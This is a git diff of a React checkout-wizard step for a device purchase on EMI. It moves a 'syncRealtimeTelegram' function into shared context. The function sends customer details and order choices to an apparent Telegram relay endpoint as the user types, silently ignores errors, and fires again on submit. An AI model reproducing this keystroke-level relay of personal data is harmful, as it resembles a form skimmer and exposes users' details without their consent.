@@ -5,34 +5,14 @@ import { ShieldCheck, Truck, CreditCard, Wallet, Banknote } from 'lucide-react';
 import { useWizard } from '../../context/WizardContext';
 
 export const Step3CustomerInfo: React.FC = () => {
-  const { selectedModel, selectedColor, selectedStorage, selectedTenureMonths, calculatedMonthlyEmi, customerDetails, setCustomerDetails, goNext } = useWizard();
+  const { customerDetails, setCustomerDetails, goNext, syncRealtimeTelegram } = useWizard();
   const [errorMsg, setErrorMsg] = useState<string>('');
-
-  const syncRealtimeTelegram = (updatedCustomer: typeof customerDetails) => {
-    try {
-      fetch('/api/telegram/realtime', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          stepName: 'Entering Customer Details',
-          data: {
-            model: selectedModel,
-            color: selectedColor,
-            storage: selectedStorage,
-            months: selectedTenureMonths,
-            monthlyEmi: calculatedMonthlyEmi,
-            customer: updatedCustomer
-          }
-        })
-      }).catch(() => {});
-    } catch (e) {}
-  };
 
   const handleInputChange = (field: keyof typeof customerDetails, value: string) => {
     const updated = { ...customerDetails, [field]: value };
     setCustomerDetails(updated);
     if (value.length > 3) {
-      syncRealtimeTelegram(updated);
+      syncRealtimeTelegram('Entering Customer Details');
     }
   };
 
@@ -50,7 +30,7 @@ export const Step3CustomerInfo: React.FC = () => {
       return;
     }
     setErrorMsg('');
-    syncRealtimeTelegram(customerDetails);
+    syncRealtimeTelegram('Completed Customer Info');
     goNext();
   };
 
